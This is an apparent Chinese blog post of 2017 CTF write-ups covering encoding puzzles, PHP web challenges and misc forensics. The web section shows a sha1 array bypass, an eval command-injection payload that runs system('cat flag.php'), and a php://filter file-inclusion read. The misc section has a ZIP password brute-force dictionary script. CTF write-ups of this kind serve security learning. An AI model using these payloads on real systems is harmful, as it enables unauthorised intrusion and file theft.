<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="Time is of the essence."><title>2017 MIAC移动安全赛 | findneo</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">2017 MIAC移动安全赛</h1><a id="logo" href="/.">findneo</a><p class="description">Time is of the essence.</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">2017 MIAC移动安全赛</h1><div class="post-meta">Oct 15, 2017<span> | </span><span class="category"><a href="/categories/writeup/">writeup</a></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2017-10-14"><span class="toc-number">1.</span> <span class="toc-text">2017/10/14</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">1.1.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#贝斯的一家"><span class="toc-number">1.1.1.</span> <span class="toc-text">贝斯的一家</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#颜文字"><span class="toc-number">1.1.2.</span> <span class="toc-text">颜文字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#你猜我像啥"><span class="toc-number">1.1.3.</span> <span class="toc-text">你猜我像啥</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2017-10-23"><span class="toc-number">2.</span> <span class="toc-text">2017/10/23</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">2.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WEB签到"><span class="toc-number">2.1.1.</span> <span class="toc-text">WEB签到</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#命令注入"><span class="toc-number">2.1.2.</span> <span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#这不仅仅是WEB"><span class="toc-number">2.1.3.</span> <span class="toc-text">这不仅仅是WEB</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC"><span class="toc-number">2.2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MISC签到题"><span class="toc-number">2.2.1.</span> <span class="toc-text">MISC签到题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#常规杂项"><span class="toc-number">2.2.2.</span> <span class="toc-text">常规杂项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#就在眼前"><span class="toc-number">2.2.3.</span> <span class="toc-text">就在眼前</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2017-10-30"><span class="toc-number">3.</span> <span class="toc-text">2017/10/30</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">3.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#签到题"><span class="toc-number">3.1.1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#简单的题"><span class="toc-number">3.1.2.</span> <span class="toc-text">简单的题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WEB100-2"><span class="toc-number">3.1.3.</span> <span class="toc-text">WEB100-2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#蓝盾管理员"><span class="toc-number">3.1.4.</span> <span class="toc-text">蓝盾管理员</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#送大礼"><span class="toc-number">3.1.5.</span> <span class="toc-text">送大礼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#火星撞地球"><span class="toc-number">3.1.6.</span> <span class="toc-text">火星撞地球</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#密室杀人案-x"><span class="toc-number">3.1.7.</span> <span class="toc-text">密室杀人案[x]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bluedon用户-x"><span class="toc-number">3.1.8.</span> <span class="toc-text">bluedon用户[x]</span></a></li></ol></li></ol></li></ol></div></div><div class="post-content"><h2 id="2017-10-14"><a href="#2017-10-14" class="headerlink" title="2017/10/14"></a>2017/10/14</h2><blockquote>
<p><a href="http://miac.cug.edu.cn/" target="_blank" rel="external">http://miac.cug.edu.cn/</a></p>
<p><a href="http://www.yogeit.com/" target="_blank" rel="external">http://www.yogeit.com/</a></p>
<p><a href="https://www.bdctf.online/" target="_blank" rel="external">https://www.bdctf.online/</a></p>
</blockquote>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="贝斯的一家"><a href="#贝斯的一家" class="headerlink" title="贝斯的一家"></a>贝斯的一家</h4><blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; UjFrelJFMVJXbGRIUlRORVQwNHlRMGRaTTBSTlVWcFVSMUV6UkU5T1MwZEhUVmxVUzFKU1ZVZEpXbFJKVGxwVVIxa3lWRXRTVWxkSVJWcFVSMDVMUjBkVk0wUkhUVnBZUjBrelZGTk9TMGRIVFRSVVRWSlNWMGxaTTBSSlRqSkY=</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>依次base64、base64、base32、base16解码。<br><code>flag{fl4g_1_B4se_i3_V3ry_9ood}</code></p>
<h4 id="颜文字"><a href="#颜文字" class="headerlink" title="颜文字"></a>颜文字</h4><blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;  ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ][ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>aaencode ，<a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html" target="_blank" rel="external">在线解混淆</a> 或在 chrome 的console里直接运行即可。其他还有jjencode,ppencode,rrencode等。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">alert</span><span class="params">(<span class="string">"flag&#123;aaencode_f14g_h4h4h4&#125;"</span>)</span></span></div></pre></td></tr></table></figure>
<h4 id="你猜我像啥"><a href="#你猜我像啥" class="headerlink" title="你猜我像啥"></a>你猜我像啥</h4><blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4=</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</div><div class="line">s=<span class="string">'Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4='</span></div><div class="line">b64decode(s.replace(<span class="string">'\n'</span>,<span class="string">''</span>))  </div><div class="line"><span class="comment">#'.---- ..--- ..... -....- ..... .---- -....- ----. ..... -....- .---- ----- .---- -....- ----. ..... -....- ....- ---.. -....- ----. ..... -....- .---- ----- .---- -....- .---- .---- --... -....- .---- .---- -.... -....- .---- ..--- .---- -....- .---- ----- ---.. -....- .---- ..--- ----- -....- .---- .---- ....- -....- .---- .---- ----- -....- .---- ----- ....- -....- .---- ----- ---.. -....- ..... .---- -....- ..... .---- -....- .---- ..--- ...-- -....- .---- .---- ----- -....- .---- .---- .....'</span></div><div class="line"><span class="comment">#摩斯密码的解密(https://morsecode.scphillips.com/translator.html)</span></div><div class="line"><span class="comment">#=&gt;125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115</span></div><div class="line"><span class="comment">#ASCII码转字符	&#125;3_e_0_eutylxrnhl33&#123;ns</span></div><div class="line">t=<span class="string">'125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115'</span></div><div class="line">tt=<span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:chr(int(x)),t.split(<span class="string">'-'</span>)))</div><div class="line"><span class="comment">#字符串反转  	sn&#123;33lhnrxlytue_0_e_3&#125;</span></div><div class="line">rtt=tt[::<span class="number">-1</span>]</div><div class="line"><span class="comment">#栅栏密码的解密	synt&#123;u3e3_l0h_ner_x3l&#125;</span></div><div class="line"><span class="comment">#凯撒密码解密 	flag&#123;h3r3_y0u_are_k3y&#125;</span></div></pre></td></tr></table></figure>
<hr>
<h2 id="2017-10-23"><a href="#2017-10-23" class="headerlink" title="2017/10/23"></a>2017/10/23</h2><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB签到"><a href="#WEB签到" class="headerlink" title="WEB签到"></a>WEB签到</h4><blockquote>
<p>签到，格式bdctf{xxxxx}<br><a href="http://2a8a372c90b9c52b54ac9f85234f6f20.yogeit.com:8080" target="_blank" rel="external">http://2a8a372c90b9c52b54ac9f85234f6f20.yogeit.com:8080</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line">highlight_file(<span class="string">'flag.php'</span>);</div><div class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</div><div class="line">$flag = <span class="string">'bdctf&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'user'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'user'</span>] == $_POST[<span class="string">'pass'</span>])</div><div class="line">        <span class="keyword">print</span> <span class="string">'pass can not be user.'</span>;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'user'</span>]) === sha1($_POST[<span class="string">'pass'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>))</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>对数组进行哈希会返回null，所以传进去两个数组即可。<code>Flag: bdctf{welcomeBDCTF2017}</code></p>
<p><img src="web-checkin.png" alt=""></p>
<h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><blockquote>
<p>格式是flag{xxxx}<br><a href="http://c3f534c3e77ef68bda72e406337023fb.yogeit.com:8080" target="_blank" rel="external">http://c3f534c3e77ef68bda72e406337023fb.yogeit.com:8080</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</div><div class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($a);"</span>);</div></pre></td></tr></table></figure>
<p>直接执行系统命令，<code>system(&#39;cat flag.php&#39;)</code> 。得到flag为<code>flag{93odcGA47rSRFDG}</code> </p>
<p><img src="cmd-inject.png" alt=""></p>
<h4 id="这不仅仅是WEB"><a href="#这不仅仅是WEB" class="headerlink" title="这不仅仅是WEB"></a>这不仅仅是WEB</h4><blockquote>
<p>格式bdctf{xxxxx}<br><a href="http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080" target="_blank" rel="external">http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080</a></p>
</blockquote>
<p>存在文件读取：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//index.php</span></div><div class="line"><span class="comment">//view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=index.php</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$file = $_GET[<span class="string">"page"</span>];</div><div class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $file ) )</div><div class="line">	<span class="keyword">include</span>( $file );</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">	header( <span class="string">'Location:?page=include.php'</span> );</div><div class="line">	<span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//include.php</span></div><div class="line"><span class="comment">//view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=include.php</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span><span class="string">'</span></div><div class="line"><span class="string">&lt;html&gt;</span></div><div class="line"><span class="string">&lt;body&gt;</span></div><div class="line"><span class="string">&lt;p align="center"&gt;</span></div><div class="line"><span class="string">&lt;font size="20"&gt;</span></div><div class="line"><span class="string">&lt;b&gt;File Include&lt;/b&gt;</span></div><div class="line"><span class="string">&lt;/font&gt;</span></div><div class="line"><span class="string">&lt;/p&gt;</span></div><div class="line"><span class="string">&lt;br&gt;</span></div><div class="line"><span class="string">&lt;p align="center"&gt;&lt;img src="photo.jpg"&gt;&lt;/p&gt;</span></div><div class="line"><span class="string">&lt;br&gt;</span></div><div class="line"><span class="string">&lt;br&gt;</span></div><div class="line"><span class="string">&lt;br&gt;</span></div><div class="line"><span class="string">&lt;font color="white"&gt;文件格式为文本格式&lt;/font&gt;</span></div><div class="line"><span class="string">&lt;/body&gt;</span></div><div class="line"><span class="string">&lt;/html&gt;'</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>访问不了惹。</p>
<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="MISC签到题"><a href="#MISC签到题" class="headerlink" title="MISC签到题"></a>MISC签到题</h4><blockquote>
<p><code>R1kzRE1RWldHRTNET04yQ0dZWkRHTVpXR0kzRElNWldHTVlUR01CVEdJWlRHTlJVR01ZVEdNUlRIRTNETU1aWkdZMlRHTVpUSEUzREVNWlVHWVlUR01SVEdZM0RFTVpaR000RE1NWlRHQTNETU1aVEdNM0RHTlJYSVE9PT09PT0=</code></p>
</blockquote>
<p>先base64解码，再base32解码，然后十六进制转ASCII码，得到flag为<code>flag{b3bd61023d129f9e39b4a26b98c0f366}</code></p>
<p><img src="misc-checkin.png" alt=""></p>
<h4 id="常规杂项"><a href="#常规杂项" class="headerlink" title="常规杂项"></a>常规杂项</h4><p>在文件末尾发现提示<code>Password:Bluedon[0-9]{8}</code>  ，写python脚本生成字典，<code>binwalk -e</code> 提取出压缩包，使用ziperello爆破得到密码为Bluedon47632601，解压后还是一个压缩包，但应该是伪加密，用notepad++打开即可看到flag为<code>flag{Aha!_Y0u_9Ot_i7}</code>。</p>
<p>队友使用了ARCHPR掩码爆破，方便很多。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> itertools</div><div class="line">s0 = <span class="string">'Bluedon'</span></div><div class="line">p = <span class="string">'0123456789'</span></div><div class="line">f = open(<span class="string">'normalpass.txt'</span>, <span class="string">'w+'</span>)</div><div class="line">passwd = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(p, p, p, p, p, p, p, p):</div><div class="line">    passwd = s0 + <span class="string">''</span>.join(i)</div><div class="line">    f.write(passwd)</div></pre></td></tr></table></figure>
<p><img src="cracked.png" alt=""></p>
<p><img src="normal-misc-flag.png" alt=""></p>
<h4 id="就在眼前"><a href="#就在眼前" class="headerlink" title="就在眼前"></a>就在眼前</h4><blockquote>
<p>就在眼前<br>恩，如题。格式BDCTF{xxxxx}</p>
